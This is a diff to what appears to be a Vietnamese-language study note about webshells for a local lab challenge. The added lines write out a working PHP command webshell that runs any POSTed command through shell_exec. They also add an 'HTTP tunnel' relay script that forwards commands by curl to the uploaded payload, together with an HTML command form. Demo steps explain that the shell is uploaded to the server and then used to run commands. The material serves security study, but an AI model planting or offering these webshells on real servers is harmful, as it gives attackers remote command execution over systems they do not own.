@@ -57,6 +57,53 @@ if (isset($_POST['cmd'])) {
 
 2. Http Tunnel
 
+- Webshell
+
+```
+<?php
+if (isset($_POST['cmd'])) {
+    $command = $_POST['cmd'];
+    $output = shell_exec($command);
+    echo $output;
+}
+?>
+```
+
+- Server
+
+```
+<?php
+$url = 'http://localhost/Challenge10-AnhNT/uploads/teacher/Payload.php';
+$command = $_POST['cmd'];
+$data = [
+    'cmd' => $command,
+];
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+$response = curl_exec($ch);
+curl_close($ch);
+echo $response;
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP CmdShell</title>
+</head>
+<body>
+    <form method="POST">
+        <label for="cmd">Nhập lệnh shell:</label><br>
+        <input type="text" name="cmd" id="cmd" required><br>
+        <input type="submit" value="Thực thi">
+    </form>
+</body>
+</html>
+```
+
 3. Chooper
 
 ```
@@ -108,3 +155,17 @@ if($_SERVER['REQUEST_METHOD'] === 'POST'){
     - eval(Container.DataItem, "CategoryName")
     - eval("CreatTime", "{0:dd/MM/yyyy (HH:mm:ss),
     - eval("AMT_PAY","{0:#,##0}")  
+
+# Demo
+
+- Cmdshell
+
+    - Sau khi upload webshell lên máy chủ, truy cập vào đường dẫn chứa webshell và gõ lệnh muốn dùng.
+ 
+    <img src = ''>
+
+- Http tunnel
+
+    - Sau khi upload webshell lên máy chủ, ở phía server gõ lệnh muốn dùng.
+ 
+    <img src = ''> 
